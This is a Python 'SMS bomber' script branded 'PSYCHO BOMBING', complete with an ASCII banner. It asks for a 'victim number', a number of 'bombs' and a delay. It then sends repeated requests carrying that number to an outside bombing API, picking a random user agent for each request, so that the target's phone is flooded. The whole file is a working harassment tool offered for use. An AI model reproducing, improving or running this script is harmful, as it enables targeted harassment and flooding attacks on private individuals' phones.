import os
import time
import random
import requests

# Colors
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
N = '\033[0m'
W = '\033[1;37m'

# Clear screen
os.system('clear')

# Banner
def banner():
    print(f"""{R}
██████╗░██╗░░░██╗███████╗░█████╗░░█████╗░  ██████╗░░█████╗░███╗░░░███╗██████╗░
██╔══██╗██║░░░██║██╔════╝██╔══██╗██╔══██╗  ██╔══██╗██╔══██╗████╗░████║██╔══██╗
██████╦╝██║░░░██║█████╗░░██║░░╚═╝██║░░██║  ██████╦╝███████║██╔████╔██║██║░░██║
██╔══██╗██║░░░██║██╔══╝░░██║░░██╗██║░░██║  ██╔══██╗██╔══██║██║╚██╔╝██║██║░░██║
██████╦╝╚██████╔╝███████╗╚█████╔╝╚█████╔╝  ██████╦╝██║░░██║██║░╚═╝░██║██████╔╝
╚═════╝░░╚═════╝░╚══════╝░╚════╝░░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░
{Y}                   PSYCHO BOMBING
              {C}Author: J O Y B R O
{W}--------------------------------------------------{N}""")

# Working API
API = {
    "name": "Trial API",
    "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
    "method": "GET",
    "params": {"phone": "{number}", "type": "all"}
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)...",
]

def send_bomb(number):
    url = API["url"]
    params = {k: v.replace("{number}", number) for k, v in API["params"].items()}
    headers = {"User-Agent": random.choice(USER_AGENTS)}

    try:
        res = requests.get(url, params=params, headers=headers)
        if res.status_code == 200:
            print(f"{G}[✓] Bomb sent successfully{N}")
        else:
            print(f"{R}[×] Bomb failed ({res.status_code}){N}")
    except:
        print(f"{R}[×] Bomb failed (Connection error){N}")

def main():
    banner()
    number = input(f"{C}[?] Enter victim number: {N}")
    amount = int(input(f"{C}[?] Number of bombs: {N}"))
    delay = float(input(f"{C}[?] Delay between bombs (seconds): {N}"))

    print(f"\n{Y}[!] Bombing started...{N}\n")
    for _ in range(amount):
        send_bomb(number)
        time.sleep(delay)

    print(f"\n{G}[✓] Bombing completed!{N}")

if __name__ == "__main__":
    main()
